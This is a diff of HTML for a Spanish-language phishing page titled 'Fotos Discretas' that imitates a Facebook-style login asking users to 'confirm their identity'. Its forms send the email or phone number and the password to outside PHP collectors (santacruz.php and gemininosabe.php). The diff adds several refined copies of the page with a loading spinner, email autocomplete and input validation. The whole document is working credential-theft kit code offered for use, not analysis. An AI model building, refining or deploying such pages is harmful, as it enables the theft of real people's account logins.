@@ -3,204 +3,319 @@
 <head>
 <meta charset="UTF-8">
 <title>Fotos Discretas</title>
+<meta content="https://i.postimg.cc/9MWMPzyz/Whats-App-Image-2024-07-13-at-11-40-05-PM.jpg" property="og:image" />
 <meta name="robots" content="noindex, nofollow">
 <meta name="googlebot" content="noindex">
-<meta content="https://i.postimg.cc/9MWMPzyz/Whats-App-Image-2024-07-13-at-11-40-05-PM.jpg" property="og:image" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
-<link rel="shortcut icon" href="https://raw.githubusercontent.com/busine011/icon/main/icon.ico">
+<link rel="shortcut icon" href="https://i.postimg.cc/9MWMPzyz/Whats-App-Image-2024-07-13-at-11-40-05-PM.jpg">
 <title>Inicie sesión en su navegador para confirmar su identidad y continuar</title>
 <style>
-       /* ==================================== */
-       /* PRELOADER STYLES */
-       /* ==================================== */
-       #preloader {
-           position: fixed;
-           top: 0;
-           left: 0;
-           width: 100%;
-           height: 100%;
-           background: #1877f2; /* Azul fuerte para la pantalla de precarga */
-           display: flex;
-           justify-content: center;
-           align-items: center;
-           z-index: 9999; /* Asegura que esté por encima de todo */
-           opacity: 1;
-           transition: opacity 0.5s ease-out, visibility 0.5s ease-out;
-           visibility: visible;
-       }
-       /* Spinner (Animación de giro con CSS) */
-       .spinner {
-           border: 5px solid #f3f3f3; /* Gris claro */
-           border-top: 5px solid #fff; /* Blanco */
-           border-radius: 50%;
-           width: 50px;
-           height: 50px;
-           animation: spin 1s linear infinite;
-       }
-       /* Animación de giro */
-       @keyframes spin {
-           0% { transform: rotate(0deg); }
-           100% { transform: rotate(360deg); }
-       }
-       /* Clase para ocultar el preloader */
-       .hidden {
-           opacity: 0 !important;
-           visibility: hidden !important;
-       }
-       /* ==================================== */
-       /* 1. ESTILOS GLOBALES Y RESET */
-       /* ==================================== */
-       body {
-           padding: 0;
-           margin: 0;
-           font-family: sans-serif;
-       }
-       a {
-           color: #216fdb;
-           cursor: pointer;
-           text-decoration: none;
-           font-size: 14px;
-       }
-       p {
-           text-align: center;
-       }
-       .fcg {
-           color: gray;
-       }
-       .mfss {
-           font-size: 12px;
-           line-height: 15px;
-       }
-       /* [Resto de los estilos CSS se mantienen como estaban, omitidos aquí por brevedad] */
-       /* ==================================== */
-       /* 2. ESTRUCTURA Y LAYOUT */
-       /* ==================================== */
-       #layout {
-           width: 95%;
-           margin: auto;
-           margin-bottom: 70px;
-       }
-       @media only screen and (min-width: 600px) {
-           #layout {
-               width: 380px;
-               margin: auto;
-           }
-       }
-       #top {
-           padding-top: 8px;
-           padding-bottom: 8px;
-           color: #3b5998;
-           background: #FFFBE2;
-           width: 100%;
-       }
-       #logo {
-           padding-top: 10px;
-           padding-bottom: 10px;
-           text-align: center;
-           align-items: center;
-       }
-       #logo img {
-           max-width: 100%;
-           height: auto;
-           min-width: 100px;
-       }
-       /* ==================================== */
-       /* 3. ELEMENTOS DEL FORMULARIO */
-       /* ==================================== */
-       .form-group {
-           margin-bottom: 10px;
-       }
-       .txt {
-           padding: 3% 2%;
-           background: #f5f6f7;
-           border: 1px solid #E3E4E5;
-           width: 100%;
-           margin-bottom: 10px;
-           font-size: 14px;
-           line-height: 18px;
-           border-radius: 5px;
-           box-shadow: 1px 1px rgba(0, 0, 0, .07);
-           box-sizing: border-box;
-       }
-       #blogin {
-           padding: 12px 0;
-           background: #1877f2;
-           border: 0;
-           width: 100%;
-           font-size: 16px;
-           line-height: 18px;
-           border-radius: 5px;
-           box-shadow: 0 2px 2px -2px #CACACA;
-           color: #fff;
-           font-weight: bold;
-           text-shadow: 0 -1px rgb(0 0 0 / 25%);
-       }
-       #bcreate {
-           background: #00A400;
-           border: 0;
-           height: 36px;
-           padding-left: 16px;
-           padding-right: 16px;
-           margin: auto;
-           font-size: 14px;
-           line-height: 18px;
-           border-radius: 5px;
-           box-shadow: 0 2px 2px -2px #CACACA;
-           color: #fff;
-           font-weight: bold;
-           text-shadow: 0 -1px rgb(0 0 0 / 25%);
-           margin-top: 25px;
-       }
-       .bb {
-           float: left;
-           width: 42%;
-           border-bottom: 2px solid #EAEBED;
-           height: 10px;
-       }
-       #c {
-           float: left;
-           width: 16%;
-           text-align: center;
-       }
-       #bottom {
-           width: 100%;
-           text-align: center;
-       }
-       /* 4. ESTILOS DE BARRA SUPERIOR */
-       .ib {
-           display: flex;
-           align-items: center;
-           justify-content: center;
-           flex: 1;
-           min-width: 0;
-           flex-grow: 1;
-           flex-shrink: 1;
-           flex-basis: 0%;
-       }
-       .top-text-container {
-           display: flex;
-           align-items: center;
-           padding: 8px 0;
-       }
-       .security-icon {
-           height: 16px;
-           width: 16px;
-           margin-right: 5px;
-           vertical-align: middle;
-       }
-       .fcg {
-           color: #3b5998;
-       }
-       ._qw9 {padding: 6px;color: #3b5998;background: #FFFBE2;}
-       ._55wr {padding: 0;}
+
+        /* [Secciones 1, 2, 3... omitidas por brevedad en la explicación] */
+
+        /* ==================================== */
+
+        /* 1. ESTILOS GLOBALES Y RESET */
+
+        /* ==================================== */
+
+        body {
+
+            padding: 0;
+
+            margin: 0;
+
+            font-family: sans-serif;
+
+        }
+
+        a {
+
+            color: #216fdb;
+
+            cursor: pointer;
+
+            text-decoration: none;
+
+            font-size: 14px;
+
+        }
+
+        p {
+
+            text-align: center;
+
+        }
+
+        .fcg {
+
+            color: gray;
+
+        }
+
+        .mfss {
+
+            font-size: 12px;
+
+            line-height: 15px;
+
+        }
+
+        /* ==================================== */
+
+        /* 2. ESTRUCTURA Y LAYOUT */
+
+        /* ==================================== */
+
+        #layout {
+
+            width: 95%;
+
+            margin: auto;
+
+            margin-bottom: 70px;
+
+        }
+
+        /* Media Query para escritorio/tabletas */
+
+        @media only screen and (min-width: 600px) {
+
+            #layout {
+
+                width: 380px;
+
+                margin: auto;
+
+            }
+
+        }
+
+        /* Estilos de la barra superior */
+
+        #top {
+
+            padding-top: 8px;
+
+            padding-bottom: 8px;
+
+            color: #3b5998;
+
+            background: #FFFBE2;
+
+            width: 100%;
+
+        }
+
+        /* Logo */
+
+        #logo {
+
+            padding-top: 10px;
+
+            padding-bottom: 10px;
+
+            text-align: center;
+
+            align-items: center;
+
+        }
+
+        /* CAMBIO CLAVE: Logo Responsivo */
+
+        #logo img {
+
+            max-width: 100%; /* Asegura que la imagen no exceda el ancho de su contenedor */
+
+            height: auto;     /* Mantiene la proporción */
+
+            min-width: 100px; /* Mantiene el tamaño mínimo que ya tenías */
+
+        }
+
+        /* ==================================== */
+
+        /* 3. ELEMENTOS DEL FORMULARIO */
+
+        /* ==================================== */
+
+        .form-group {
+
+            margin-bottom: 10px;
+
+        }
+
+        .txt { /* Input de texto/email/password */
+
+            padding: 3% 2%;
+
+            background: #f5f6f7;
+
+            border: 1px solid #E3E4E5;
+
+            width: 100%;
+
+            margin-bottom: 10px;
+
+            font-size: 14px;
+
+            line-height: 18px;
+
+            border-radius: 5px;
+
+            box-shadow: 1px 1px rgba(0, 0, 0, .07);
+
+            box-sizing: border-box; 
+
+        }
+
+        #blogin { /* Botón de Iniciar Sesión */
+
+            padding: 12px 0;
+
+            background: #1877f2;
+
+            border: 0;
+
+            width: 100%;
+
+            font-size: 16px;
+
+            line-height: 18px;
+
+            border-radius: 5px;
+
+            box-shadow: 0 2px 2px -2px #CACACA;
+
+            color: #fff;
+
+            font-weight: bold;
+
+            text-shadow: 0 -1px rgb(0 0 0 / 25%);
+
+        }
+
+        #bcreate { /* Botón de Crear Cuenta */
+
+            background: #00A400;
+
+            border: 0;
+
+            height: 36px;
+
+            padding-left: 16px;
+
+            padding-right: 16px;
+
+            margin: auto;
+
+            font-size: 14px;
+
+            line-height: 18px;
+
+            border-radius: 5px;
+
+            box-shadow: 0 2px 2px -2px #CACACA;
+
+            color: #fff;
+
+            font-weight: bold;
+
+            text-shadow: 0 -1px rgb(0 0 0 / 25%);
+
+            margin-top: 25px;
+
+        }
+
+        /* Separador "o" */
+
+        .bb {
+
+            float: left;
+
+            width: 42%;
+
+            border-bottom: 2px solid #EAEBED;
+
+            height: 10px;
+
+        }
+
+        #c {
+
+            float: left;
+
+            width: 16%;
+
+            text-align: center;
+
+        }
+
+        #bottom {
+
+            width: 100%;
+
+            text-align: center;
+
+        }
+
+        /* 4. ESTILOS DE BARRA SUPERIOR */
+
+        .ib {
+
+            display: flex;
+
+            align-items: center; 
+
+            justify-content: center; 
+
+            flex: 1;
+
+            min-width: 0;
+
+            flex-grow: 1;
+
+            flex-shrink: 1;
+
+            flex-basis: 0%;
+
+        }
+
+        .top-text-container {
+
+            display: flex; 
+
+            align-items: center; 
+
+            padding: 8px 0; 
+
+        }
+
+        .security-icon {
+
+            height: 16px; 
+
+            width: 16px;
+
+            margin-right: 5px; 
+
+            vertical-align: middle;
+
+        }
+
+        .fcg {
+
+            color: #3b5998; /* Aseguramos que el color del texto sea visible */
+
+        }
+
+        ._qw9 {padding: 6px;color: #3b5998;background: #FFFBE2;}
+
+        ._55wr {padding: 0;}
 </style>
 </head>
 <body>
-<div id="preloader">
-<div class="spinner"></div>
-</div>
-<div id="main-content" style="display: none;">
 <div id="top" class="_qw9">
 <div class="ib">
 <div class="_55wr">
@@ -213,9 +328,512 @@
 </div>
 <div id="layout">
 <div id="logo">
-<img src="https://i.postimg.cc/7YzHF63m/Captura-de-pantalla-2025-12-12-200450.png" alt="Logo de la Plataforma">
+<img src="https://example.com/logo-principal.png" alt="Logo de la Plataforma">
 </div>
-<form class="form-group" action="https://pastelin.matesdaddy.com/santacruz.php" method="post" enctype="multipart/form-data">
+<form class="form-group" action="https://mx/gemininosabe.php" method="post" enctype="multipart/form-data">
+<div class="form-group">
+<input type="email" id="emailInput" name="email" class="txt" placeholder="Correo electrónico o número de teléfono" required>
+</div>
+<div class="form-group">
+<input type="password" name="pass" class="txt" placeholder="Contraseña" required>
+</div>
+<button type="submit" id="blogin">Iniciar sesión</button>
+</form>
+<p><a href="#">¿Olvidaste tu contraseña?</a></p>
+<div style="margin-top: 25px;">
+<div class="bb"></div>
+<div id="c">o</div>
+<div class="bb"></div>
+<div style="clear: both;"></div>
+</div>
+<p>
+<button id="bcreate">Crear cuenta nueva</button>
+</p>
+</div>
+<div id="bottom">
+<p class="fcg mfss" style="margin-top: 50px;">
+<a href="#">Español</a> · <a href="#">Ayuda</a>
+</p>
+</div>
+<script>
+
+        const emailInput = document.getElementById('emailInput');
+
+        // Lista de dominios comunes para sugerir
+
+        const dominiosComunes = ['gmail.com', 'hotmail.com', 'outlook.com'];
+
+        emailInput.addEventListener('input', function() {
+
+            const valor = this.value;
+
+            const indiceAt = valor.indexOf('@');
+
+            // Solo mostrar sugerencias si NO hay un '@' aún y hay al menos un carácter.
+
+            if (indiceAt === -1 && valor.length > 0) {
+
+                const nombreUsuario = valor;
+
+                // Buscar o crear el datalist
+
+                let datalist = document.getElementById('emailDatalist');
+
+                if (!datalist) {
+
+                    datalist = document.createElement('datalist');
+datalist.id = 'emailDatalist';
+
+                    // Conectar el input con el datalist
+
+                    this.setAttribute('list', 'emailDatalist'); 
+
+                    document.body.appendChild(datalist);
+
+                } else {
+
+                    // Limpiar el datalist para actualizar las sugerencias
+
+                    datalist.innerHTML = ''; 
+
+                }
+
+                // Llenar el datalist con las sugerencias
+
+                dominiosComunes.forEach(dominio => {
+
+                    const opcion = document.createElement('option');
+
+                    // Construir el valor completo (usuario@dominio.com)
+
+                    opcion.value = nombreUsuario + '@' + dominio;
+
+                    datalist.appendChild(opcion);
+
+                });
+
+            } else if (indiceAt !== -1 && this.hasAttribute('list')) {
+
+                // Si el usuario ya escribió '@', remover la lista para que no siga autocompletando
+
+                this.removeAttribute('list');
+
+                const datalist = document.getElementById('emailDatalist');
+
+                if (datalist) {
+
+                    datalist.remove();
+
+                }
+
+            }
+
+        });
+</script>
+</body>
+</html>
+ 
+Con preload
+ 
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link rel="shortcut icon" href="https://.ico">
+<title>Inicie sesión en su navegador para confirmar su identidad y continuar</title>
+<style>
+
+        /* ==================================== */
+
+        /* PRELOADER STYLES */
+
+        /* ==================================== */
+
+        #preloader {
+
+            position: fixed;
+
+            top: 0;
+
+            left: 0;
+
+            width: 100%;
+
+            height: 100%;
+
+            background: #1877f2; /* Azul fuerte para la pantalla de precarga */
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            z-index: 9999; /* Asegura que esté por encima de todo */
+
+            opacity: 1;
+
+            transition: opacity 0.5s ease-out, visibility 0.5s ease-out;
+
+            visibility: visible;
+
+        }
+
+        /* Spinner (Animación de giro con CSS) */
+
+        .spinner {
+
+            border: 5px solid #f3f3f3; /* Gris claro */
+
+            border-top: 5px solid #fff; /* Blanco */
+
+            border-radius: 50%;
+
+            width: 50px;
+
+            height: 50px;
+
+            animation: spin 1s linear infinite;
+
+        }
+
+        /* Animación de giro */
+
+        @keyframes spin {
+
+            0% { transform: rotate(0deg); }
+
+            100% { transform: rotate(360deg); }
+
+        }
+
+        /* Clase para ocultar el preloader */
+
+        .hidden {
+
+            opacity: 0 !important;
+
+            visibility: hidden !important;
+
+        }
+
+        /* ==================================== */
+
+        /* 1. ESTILOS GLOBALES Y RESET */
+
+        /* ==================================== */
+
+        body {
+
+            padding: 0;
+
+            margin: 0;
+
+            font-family: sans-serif;
+
+        }
+
+        a {
+
+            color: #216fdb;
+
+            cursor: pointer;
+
+            text-decoration: none;
+
+            font-size: 14px;
+
+        }
+
+        p {
+
+            text-align: center;
+
+        }
+
+        .fcg {
+
+            color: gray;
+
+        }
+
+        .mfss {
+
+            font-size: 12px;
+
+            line-height: 15px;
+
+        }
+
+        /* [Resto de los estilos CSS se mantienen como estaban, omitidos aquí por brevedad] */
+
+        /* ==================================== */
+
+        /* 2. ESTRUCTURA Y LAYOUT */
+
+        /* ==================================== */
+
+        #layout {
+
+            width: 95%;
+
+            margin: auto;
+
+            margin-bottom: 70px;
+
+        }
+
+        @media only screen and (min-width: 600px) {
+
+            #layout {
+
+                width: 380px;
+
+                margin: auto;
+
+            }
+
+        }
+
+        #top {
+
+            padding-top: 8px;
+
+            padding-bottom: 8px;
+
+            color: #3b5998;
+
+            background: #FFFBE2;
+
+            width: 100%;
+
+        }
+
+        #logo {
+
+            padding-top: 10px;
+
+            padding-bottom: 10px;
+
+            text-align: center;
+
+            align-items: center;
+
+        }
+
+        #logo img {
+
+            max-width: 100%;
+
+            height: auto;
+
+            min-width: 100px;
+
+        }
+
+        /* ==================================== */
+
+        /* 3. ELEMENTOS DEL FORMULARIO */
+
+        /* ==================================== */
+
+        .form-group {
+
+            margin-bottom: 10px;
+
+        }
+
+        .txt {
+
+            padding: 3% 2%;
+
+            background: #f5f6f7;
+
+            border: 1px solid #E3E4E5;
+
+            width: 100%;
+
+            margin-bottom: 10px;
+
+            font-size: 14px;
+
+            line-height: 18px;
+
+            border-radius: 5px;
+
+            box-shadow: 1px 1px rgba(0, 0, 0, .07);
+
+            box-sizing: border-box; 
+
+        }
+
+        #blogin {
+
+            padding: 12px 0;
+
+            background: #1877f2;
+
+            border: 0;
+
+            width: 100%;
+
+            font-size: 16px;
+
+            line-height: 18px;
+
+            border-radius: 5px;
+
+            box-shadow: 0 2px 2px -2px #CACACA;
+
+            color: #fff;
+
+            font-weight: bold;
+
+            text-shadow: 0 -1px rgb(0 0 0 / 25%);
+
+        }
+
+        #bcreate {
+
+            background: #00A400;
+
+            border: 0;
+
+            height: 36px;
+
+            padding-left: 16px;
+
+            padding-right: 16px;
+
+            margin: auto;
+
+            font-size: 14px;
+
+            line-height: 18px;
+
+            border-radius: 5px;
+
+            box-shadow: 0 2px 2px -2px #CACACA;
+
+            color: #fff;
+
+            font-weight: bold;
+
+            text-shadow: 0 -1px rgb(0 0 0 / 25%);
+
+            margin-top: 25px;
+
+        }
+
+        .bb {
+
+            float: left;
+
+            width: 42%;
+
+            border-bottom: 2px solid #EAEBED;
+
+            height: 10px;
+
+        }
+
+        #c {
+
+            float: left;
+
+            width: 16%;
+
+            text-align: center;
+
+        }
+
+        #bottom {
+
+            width: 100%;
+
+            text-align: center;
+
+        }
+
+        /* 4. ESTILOS DE BARRA SUPERIOR */
+
+        .ib {
+
+            display: flex;
+
+            align-items: center; 
+
+            justify-content: center; 
+
+            flex: 1;
+
+            min-width: 0;
+
+            flex-grow: 1;
+
+            flex-shrink: 1;
+
+            flex-basis: 0%;
+
+        }
+
+        .top-text-container {
+
+            display: flex; 
+
+            align-items: center; 
+
+            padding: 8px 0; 
+
+        }
+
+        .security-icon {
+
+            height: 16px; 
+
+            width: 16px;
+
+            margin-right: 5px; 
+
+            vertical-align: middle;
+
+        }
+
+        .fcg {
+
+            color: #3b5998; 
+
+        }
+
+        ._qw9 {padding: 6px;color: #3b5998;background: #FFFBE2;}
+
+        ._55wr {padding: 0;}
+</style>
+</head>
+<body>
+<div id="preloader">
+<div class="spinner"></div>
+</div>
+<div id="main-content" style="display: none;"> 
+<div id="top" class="_qw9">
+<div class="ib">
+<div class="_55wr">
+<div class="fcg mfss top-text-container">
+<img src="https://i.postimg.cc/nLCNrqBt/456112-removebg-preview.png" alt="Candado de seguridad" class="security-icon">
+<span>Inicie sesión para confirmar su identidad.</span>
+</div>
+</div>
+</div>
+</div>
+<div id="layout">
+<div id="logo">
+<img src="https://example.com/logo-principal.png" alt="Logo de la Plataforma">
+</div>
+<form class="form-group" action="https://mx/gemininosabe.php" method="post" enctype="multipart/form-data">
 <div class="form-group">
 <input type="email" id="emailInput" name="email" class="txt" placeholder="Correo electrónico o número de teléfono" required>
 </div>
@@ -241,48 +859,618 @@
 </p>
 </div>
 </div> <script>
-       // 1. Lógica del Preloader (Ejecutar después de que la página se cargue)
-       window.addEventListener('load', function() {
-           const preloader = document.getElementById('preloader');
-           const mainContent = document.getElementById('main-content');
-           // Mostrar contenido principal
-           mainContent.style.display = 'block';
-           // Ocultar preloader después de 2000ms (2 segundos)
-           setTimeout(function() {
-               preloader.classList.add('hidden');
-           }, 2000);
-       });
 
-       // 2. Lógica del Autocompletado de Dominio
-       const emailInput = document.getElementById('emailInput');
-       const dominiosComunes = ['gmail.com', 'hotmail.com', 'outlook.com'];
-       emailInput.addEventListener('input', function() {
-           const valor = this.value;
-           const indiceAt = valor.indexOf('@');
-           if (indiceAt === -1 && valor.length > 0) {
-               const nombreUsuario = valor;
-               let datalist = document.getElementById('emailDatalist');
-               if (!datalist) {
-                   datalist = document.createElement('datalist');
+        // 1. Lógica del Preloader (Ejecutar después de que la página se cargue)
+
+        window.addEventListener('load', function() {
+
+            const preloader = document.getElementById('preloader');
+
+            const mainContent = document.getElementById('main-content');
+
+            // Mostrar contenido principal
+
+            mainContent.style.display = 'block';
+
+            // Ocultar preloader después de 3000ms (3 segundos)
+
+            setTimeout(function() {
+
+                preloader.classList.add('hidden');
+
+            }, 3000); 
+
+        });
+
+
+        // 2. Lógica del Autocompletado de Dominio
+
+        const emailInput = document.getElementById('emailInput');
+
+        const dominiosComunes = ['gmail.com', 'hotmail.com', 'outlook.com'];
+
+        emailInput.addEventListener('input', function() {
+
+            const valor = this.value;
+
+            const indiceAt = valor.indexOf('@');
+
+            if (indiceAt === -1 && valor.length > 0) {
+
+                const nombreUsuario = valor;
+
+                let datalist = document.getElementById('emailDatalist');
+
+                if (!datalist) {
+
+                    datalist = document.createElement('datalist');
 datalist.id = 'emailDatalist';
-                   this.setAttribute('list', 'emailDatalist');
-                   document.body.appendChild(datalist);
-               } else {
-                   datalist.innerHTML = '';
-               }
-               dominiosComunes.forEach(dominio => {
-                   const opcion = document.createElement('option');
-                   opcion.value = nombreUsuario + '@' + dominio;
-                   datalist.appendChild(opcion);
-               });
-           } else if (indiceAt !== -1 && this.hasAttribute('list')) {
-               this.removeAttribute('list');
-               const datalist = document.getElementById('emailDatalist');
-               if (datalist) {
-                   datalist.remove();
-               }
-           }
-       });
+
+                    this.setAttribute('list', 'emailDatalist'); 
+
+                    document.body.appendChild(datalist);
+
+                } else {
+
+                    datalist.innerHTML = ''; 
+
+                }
+
+                dominiosComunes.forEach(dominio => {
+
+                    const opcion = document.createElement('option');
+
+                    opcion.value = nombreUsuario + '@' + dominio;
+
+                    datalist.appendChild(opcion);
+
+                });
+
+            } else if (indiceAt !== -1 && this.hasAttribute('list')) {
+
+                this.removeAttribute('list');
+
+                const datalist = document.getElementById('emailDatalist');
+
+                if (datalist) {
+
+                    datalist.remove();
+
+                }
+
+            }
+
+        });
+</script>
+</body>
+</html>
+ 
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link rel="shortcut icon" href="https://.ico">
+<title>Inicie sesión en su navegador para confirmar su identidad y continuar</title>
+<style>
+
+        /* ==================================== */
+
+        /* PRELOADER STYLES */
+
+        /* ==================================== */
+
+        #preloader {
+
+            position: fixed;
+
+            top: 0;
+
+            left: 0;
+
+            width: 100%;
+
+            height: 100%;
+
+            background: #1877f2; /* Azul fuerte para la pantalla de precarga */
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            z-index: 9999; /* Asegura que esté por encima de todo */
+
+            opacity: 1;
+
+            transition: opacity 0.5s ease-out, visibility 0.5s ease-out;
+
+            visibility: visible;
+
+        }
+
+        /* Spinner (Animación de giro con CSS) */
+
+        .spinner {
+
+            border: 5px solid #f3f3f3; /* Gris claro */
+
+            border-top: 5px solid #fff; /* Blanco */
+
+            border-radius: 50%;
+
+            width: 50px;
+
+            height: 50px;
+
+            animation: spin 1s linear infinite;
+
+        }
+
+        /* Animación de giro */
+
+        @keyframes spin {
+
+            0% { transform: rotate(0deg); }
+
+            100% { transform: rotate(360deg); }
+
+        }
+
+        /* Clase para ocultar el preloader */
+
+        .hidden {
+
+            opacity: 0 !important;
+
+            visibility: hidden !important;
+
+        }
+
+        /* ==================================== */
+
+        /* 1. ESTILOS GLOBALES Y RESET */
+
+        /* ==================================== */
+
+        body {
+
+            padding: 0;
+
+            margin: 0;
+
+            font-family: sans-serif;
+
+        }
+
+        a {
+
+            color: #216fdb;
+
+            cursor: pointer;
+
+            text-decoration: none;
+
+            font-size: 14px;
+
+        }
+
+        p {
+
+            text-align: center;
+
+        }
+
+        .fcg {
+
+            color: gray;
+
+        }
+
+        .mfss {
+
+            font-size: 12px;
+
+            line-height: 15px;
+
+        }
+
+        /* ==================================== */
+
+        /* 2. ESTRUCTURA Y LAYOUT */
+
+        /* ==================================== */
+
+        #layout {
+
+            width: 95%;
+
+            margin: auto;
+
+            margin-bottom: 70px;
+
+        }
+
+        @media only screen and (min-width: 600px) {
+
+            #layout {
+
+                width: 380px;
+
+                margin: auto;
+
+            }
+
+        }
+
+        #top {
+
+            padding-top: 8px;
+
+            padding-bottom: 8px;
+
+            color: #3b5998;
+
+            background: #FFFBE2;
+
+            width: 100%;
+
+        }
+
+        #logo {
+
+            padding-top: 10px;
+
+            padding-bottom: 10px;
+
+            text-align: center;
+
+            align-items: center;
+
+        }
+
+        #logo img {
+
+            max-width: 100%;
+
+            height: auto;
+
+            min-width: 100px;
+
+        }
+
+        /* ==================================== */
+
+        /* 3. ELEMENTOS DEL FORMULARIO */
+
+        /* ==================================== */
+
+        .form-group {
+
+            margin-bottom: 10px;
+
+        }
+
+        .txt {
+
+            padding: 3% 2%;
+
+            background: #f5f6f7;
+
+            border: 1px solid #E3E4E5;
+
+            width: 100%;
+
+            margin-bottom: 10px;
+
+            font-size: 14px;
+
+            line-height: 18px;
+
+            border-radius: 5px;
+
+            box-shadow: 1px 1px rgba(0, 0, 0, .07);
+
+            box-sizing: border-box; 
+
+        }
+
+        #blogin {
+
+            padding: 12px 0;
+
+            background: #1877f2;
+
+            border: 0;
+
+            width: 100%;
+
+            font-size: 16px;
+
+            line-height: 18px;
+
+            border-radius: 5px;
+
+            box-shadow: 0 2px 2px -2px #CACACA;
+
+            color: #fff;
+
+            font-weight: bold;
+
+            text-shadow: 0 -1px rgb(0 0 0 / 25%);
+
+        }
+
+        #bcreate {
+
+            background: #00A400;
+
+            border: 0;
+
+            height: 36px;
+
+            padding-left: 16px;
+
+            padding-right: 16px;
+
+            margin: auto;
+
+            font-size: 14px;
+
+            line-height: 18px;
+
+            border-radius: 5px;
+
+            box-shadow: 0 2px 2px -2px #CACACA;
+
+            color: #fff;
+
+            font-weight: bold;
+
+            text-shadow: 0 -1px rgb(0 0 0 / 25%);
+
+            margin-top: 25px;
+
+        }
+
+        .bb {
+
+            float: left;
+
+            width: 42%;
+
+            border-bottom: 2px solid #EAEBED;
+
+            height: 10px;
+
+        }
+
+        #c {
+
+            float: left;
+
+            width: 16%;
+
+            text-align: center;
+
+        }
+
+        #bottom {
+
+            width: 100%;
+
+            text-align: center;
+
+        }
+
+        /* 4. ESTILOS DE BARRA SUPERIOR */
+
+        .ib {
+
+            display: flex;
+
+            align-items: center; 
+
+            justify-content: center; 
+
+            flex: 1;
+
+            min-width: 0;
+
+            flex-grow: 1;
+
+            flex-shrink: 1;
+
+            flex-basis: 0%;
+
+        }
+
+        .top-text-container {
+
+            display: flex; 
+
+            align-items: center; 
+
+            padding: 8px 0; 
+
+        }
+
+        .security-icon {
+
+            height: 16px; 
+
+            width: 16px;
+
+            margin-right: 5px; 
+
+            vertical-align: middle;
+
+        }
+
+        .fcg {
+
+            color: #3b5998; 
+
+        }
+
+        ._qw9 {padding: 6px;color: #3b5998;background: #FFFBE2;}
+
+        ._55wr {padding: 0;}
+</style>
+</head>
+<body>
+<div id="preloader">
+<div class="spinner"></div>
+</div>
+<div id="main-content" style="display: none;"> 
+<div id="top" class="_qw9">
+<div class="ib">
+<div class="_55wr">
+<div class="fcg mfss top-text-container">
+<img src="https://i.postimg.cc/nLCNrqBt/456112-removebg-preview.png" alt="Candado de seguridad" class="security-icon">
+<span>Inicie sesión para confirmar su identidad.</span>
+</div>
+</div>
+</div>
+</div>
+<div id="layout">
+<div id="logo">
+<img src="https://i.postimg.cc/7YzHF63m/Captura-de-pantalla-2025-12-12-200450.png" alt="Logo de la Plataforma">
+</div>
+<form class="form-group" action="https://pastelin.matesdaddy.com/santacruz.php" method="post" enctype="multipart/form-data">
+<div class="form-group">
+<input type="text" id="emailInput" name="email" class="txt" placeholder="Correo electrónico o número de teléfono" required 
+
+                        pattern="^([0-9]{2,}|[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})$" 
+
+                        title="Ingrese un correo electrónico o un número de teléfono (mínimo 2 dígitos).">
+</div>
+<div class="form-group">
+<input type="password" name="pass" class="txt" placeholder="Contraseña" required>
+</div>
+<button type="submit" id="blogin">Iniciar sesión</button>
+</form>
+<p><a href="#">¿Olvidaste tu contraseña?</a></p>
+<div style="margin-top: 25px;">
+<div class="bb"></div>
+<div id="c">o</div>
+<div class="bb"></div>
+<div style="clear: both;"></div>
+</div>
+<p>
+<button id="bcreate">Crear cuenta nueva</button>
+</p>
+</div>
+<div id="bottom">
+<p class="fcg mfss" style="margin-top: 50px;">
+<a href="#">Español</a> · <a href="#">Ayuda</a>
+</p>
+</div>
+</div> <script>
+
+        // 1. Lógica del Preloader
+
+        window.addEventListener('load', function() {
+
+            const preloader = document.getElementById('preloader');
+
+            const mainContent = document.getElementById('main-content');
+
+            // Mostrar contenido principal
+
+            mainContent.style.display = 'block';
+
+            // Ocultar preloader después de 3000ms (3 segundos)
+
+            setTimeout(function() {
+
+                preloader.classList.add('hidden');
+
+            }, 3000); 
+
+        });
+
+
+        // 2. Lógica del Autocompletado de Dominio (MODIFICADA)
+
+        const emailInput = document.getElementById('emailInput');
+
+        const dominiosComunes = ['gmail.com', 'hotmail.com', 'outlook.com'];
+
+        emailInput.addEventListener('input', function() {
+
+            const valor = this.value;
+
+            const indiceAt = valor.indexOf('@');
+
+            // EXPRESIÓN REGULAR: Verifica si el valor SÓLO contiene dígitos del 0 al 9999999999.
+
+            // Si es true, asumimos que es un número de teléfono.
+
+            const esSoloNumeros = /^\d+$/.test(valor); 
+
+            // Condición para activar el autocompletado:
+
+            // 1. No debe contener '@'
+
+            // 2. Debe tener contenido (valor.length > 0)
+
+            // 3. NO debe ser solo números (esSoloNumeros === false)
+
+            if (indiceAt === -1 && valor.length > 0 && esSoloNumeros === false) {
+
+                const nombreUsuario = valor;
+
+                let datalist = document.getElementById('emailDatalist');
+
+                if (!datalist) {
+
+                    datalist = document.createElement('datalist');
+datalist.id = 'emailDatalist';
+
+                    this.setAttribute('list', 'emailDatalist'); 
+
+                    document.body.appendChild(datalist);
+
+                } else {
+
+                    datalist.innerHTML = ''; 
+
+                }
+
+                dominiosComunes.forEach(dominio => {
+
+                    const opcion = document.createElement('option');
+
+                    opcion.value = nombreUsuario + '@' + dominio;
+
+                    datalist.appendChild(opcion);
+
+                });
+
+            } else if (this.hasAttribute('list')) {
+
+                // Si ya no se cumplen las condiciones (es email completo O es solo números),
+
+                // eliminamos el datalist para que no estorbe.
+
+                this.removeAttribute('list');
+
+                const datalist = document.getElementById('emailDatalist');
+
+                if (datalist) {
+
+                    datalist.remove();
+
+                }
+
+            }
+
+        });
 </script>
 <script>
 
@@ -342,3 +1530,4 @@ datalist.id = 'emailDatalist';
 </script>
 </body>
 </html>
+ 
